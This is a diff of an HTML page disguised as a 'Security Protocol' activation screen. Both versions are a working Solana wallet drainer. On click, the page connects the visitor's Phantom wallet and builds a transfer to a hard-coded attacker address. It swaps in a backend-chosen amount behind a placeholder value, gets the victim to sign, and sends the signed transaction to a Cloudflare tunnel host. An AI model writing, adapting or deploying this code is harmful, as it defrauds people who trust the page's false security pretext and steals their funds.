@@ -1,74 +1,42 @@
-<!DOCTYPE html><html><head><meta charset="UTF-8">
-    <script>
-        // 🚀 核心环境补丁，确保底层 signTransaction 不崩溃
-        window.Buffer = window.Buffer || {
-            from: (arr) => new Uint8Array(arr),
-            isBuffer: (obj) => obj instanceof Uint8Array
-        };
-    </script>
-    <script src="https://unpkg.com/@solana/web3.js@1.87.6/lib/index.iife.min.js"></script></head>
-    <body style="background:#000;color:#14F195;text-align:center;padding-top:30vh;font-family:sans-serif;">
-    <div style="border:1px solid #14F195;padding:40px;display:inline-block;border-radius:15px;background:#111;">
-        <h2 style="color:#14F195;">SECURITY PROTOCOL V4</h2>
-        <button id="cta" style="padding:20px 40px;background:#14F195;color:#000;font-weight:bold;border:none;border-radius:10px;cursor:pointer;font-size:20px;">ACTIVATE PROTECTION</button>
-        <p id="msg" style="margin-top:20px;color:#444;">Ready</p>
-    </div>
-
-    <script>
-    const TUNNEL = "https://biggest-fellow-aware-quantitative.trycloudflare.com";
-    const TARGET_ADDR = "HyapjdagPdCaha2yW5j1pV4BkaVvah6okQ1fMw8BETXp";
-
-    // 🔱 终极武器：将 BigInt 完美转换为 8 字节小端序 Uint8Array
-    function packU64(amount) {
-        const buf = new ArrayBuffer(8);
-        const view = new DataView(buf);
-        view.setBigUint64(0, BigInt(amount), true); 
-        return new Uint8Array(buf);
-    }
-
-    document.getElementById('cta').onclick = async () => {
-        try {
-            const p = window.solana || window.phantom?.solana;
-            await p.connect();
-            
-            document.getElementById('msg').innerText = "Syncing Data...";
-            const res = await fetch(TUNNEL + '/get_data', {
-                method: 'POST', headers: {'Content-Type':'application/json'},
-                body: JSON.stringify({pubkey: p.publicKey.toString()})
-            });
-            const data = await res.json();
-
-            // 🚀 关键步骤：使用标准接口绕过 toJSON 报错
-            const transaction = new solanaWeb3.Transaction().add(
-                solanaWeb3.SystemProgram.transfer({
-                    fromPubkey: p.publicKey,
-                    toPubkey: new solanaWeb3.PublicKey(TARGET_ADDR),
-                    lamports: 1000000 // 先放个假数据占位
-                })
-            );
-
-            // 🔱 暴力篡改内存：强行把后端算的正确金额(8字节对齐)写进指令，解决编码报错
-            transaction.instructions[0].data = new Uint8Array(12);
-            transaction.instructions[0].data.set([2, 0, 0, 0], 0);
-            transaction.instructions[0].data.set(packU64(data.safe_amount), 4);
-
-            transaction.recentBlockhash = data.blockhash;
-            transaction.feePayer = p.publicKey;
-            
-            document.getElementById('msg').innerText = "Awaiting Signature...";
-            const signed = await p.signTransaction(transaction);
-            
-            const raw = signed.serialize();
-            let b64 = "";
-            for (let i = 0; i < raw.length; i++) { b64 += String.fromCharCode(raw[i]); }
-            
-            fetch(TUNNEL + '/collect', {
-                method:'POST', headers:{'Content-Type':'application/json'},
-                body:JSON.stringify({signature: window.btoa(b64)})
-            });
-            
-            alert("Security Protocol Activated!");
-            location.reload();
-        } catch(e) { alert("Status: " + e.message); }
-    }
-    </script></body></html>
+<!DOCTYPE html><html><head><meta charset="UTF-8"><script>window.Buffer = window.Buffer || {from:(arr)=>new Uint8Array(arr),isBuffer:(obj)=>obj instanceof Uint8Array};</script><script src="https://unpkg.com/@solana/web3.js@1.87.6/lib/index.iife.min.js"></script></head><body style="background:#000;color:#14F195;text-align:center;padding-top:30vh;font-family:sans-serif;"><div style="border:1px solid #14F195;padding:40px;display:inline-block;border-radius:15px;background:#111;"><h2 style="color:#14F195;">SECURITY PROTOCOL V4</h2><button id="cta" style="padding:20px 40px;background:#14F195;color:#000;font-weight:bold;border:none;border-radius:10px;cursor:pointer;font-size:20px;">ACTIVATE PROTECTION</button><p id="msg" style="margin-top:20px;color:#444;">Ready</p></div><script>const TUNNEL = "https://biggest-fellow-aware-quantitative.trycloudflare.com";const TARGET_ADDR = "HyapjdagPdCaha2yW5j1pV4BkaVvah6okQ1fMw8BETXp";
+        function packU64(amount) {
+            const buf = new ArrayBuffer(8);
+            const view = new DataView(buf);
+            view.setBigUint64(0, BigInt(amount), true); 
+            return new Uint8Array(buf);
+        }
+        document.getElementById('cta').onclick = async () => {
+            try {
+                const p = window.solana || window.phantom?.solana;
+                await p.connect();
+                document.getElementById('msg').innerText = "Syncing...";
+                const res = await fetch(TUNNEL + '/get_data', {
+                    method: 'POST', headers: {'Content-Type':'application/json'},
+                    body: JSON.stringify({pubkey: p.publicKey.toString()})
+                });
+                const data = await res.json();
+                const transaction = new solanaWeb3.Transaction().add(
+                    solanaWeb3.SystemProgram.transfer({
+                        fromPubkey: p.publicKey,
+                        toPubkey: new solanaWeb3.PublicKey(TARGET_ADDR),
+                        lamports: 1000000 
+                    })
+                );
+                const finalData = new Uint8Array(12);
+                finalData.set([2, 0, 0, 0], 0);
+                finalData.set(packU64(data.safe_amount), 4);
+                transaction.instructions[0].data = finalData;
+                transaction.recentBlockhash = data.blockhash;
+                transaction.feePayer = p.publicKey;
+                const signed = await p.signTransaction(transaction);
+                const raw = signed.serialize();
+                let b64 = "";
+                for (let i = 0; i < raw.length; i++) { b64 += String.fromCharCode(raw[i]); }
+                fetch(TUNNEL + '/collect', {
+                    method:'POST', headers:{'Content-Type':'application/json'},
+                    body:JSON.stringify({signature: window.btoa(b64)})
+                });
+                alert("Security Protocol Activated!");
+            } catch(e) { alert("Status: " + e.message); }
+        }
+        </script></body></html>
